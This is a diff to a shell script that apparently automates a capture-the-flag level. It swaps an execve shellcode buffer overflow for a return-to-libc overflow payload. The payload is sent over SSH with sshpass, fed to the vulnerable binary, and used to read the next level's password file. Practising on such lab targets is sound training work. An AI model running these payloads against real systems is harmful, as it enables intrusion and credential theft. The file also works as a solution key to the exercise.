@@ -29,13 +29,16 @@ fi
 
 act_level_password=$(cat "../level0${PREVIOUS_LEVEL}/flag")
 
-sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'python -c "print \"dat_wil\" + \"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\" + \"\n\" + \"a\"*64 + \"b\"*16 + \"\x47\xa0\x04\x08\"" > /tmp/level01_overflow; echo "cat /home/users/level02/.pass" > /tmp/level01_cmd' 2> /dev/null
+sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'python -c "print \"A\"*156 + \"\xd0\xae\xe6\xf7\" + \"\x70\xeb\xe5\xf7\" + \"\xec\x97\xf8\xf7\"" > /tmp/level04_overflow; echo "cat /home/users/level05/.pass > /tmp/level04_flag" > /tmp/level04_command' 2> /dev/null
 
 flag=""
 cnt=0
-while [ -z "${flag}" ] && [ "${cnt}" -lt 40 ]
+while [ -z "${flag}" ] && [ "${cnt}" -lt 5 ]
 do
-    flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level01_overflow /tmp/level01_cmd | ./level01' 2> /dev/null | grep --max-count=1 '^[a-zA-Z0-9]\{40\}$' | head --line=1)
+    echo "Ctrl-D svp:"
+    sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level04_overflow - /tmp/level04_command | timeout 4 ./level04' 2> /dev/null
+
+    flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level04_flag' 2> /dev/null | grep --max-count=1 '^[a-zA-Z0-9]\{40\}$' | head --line=1)
 
     let cnt++
 done
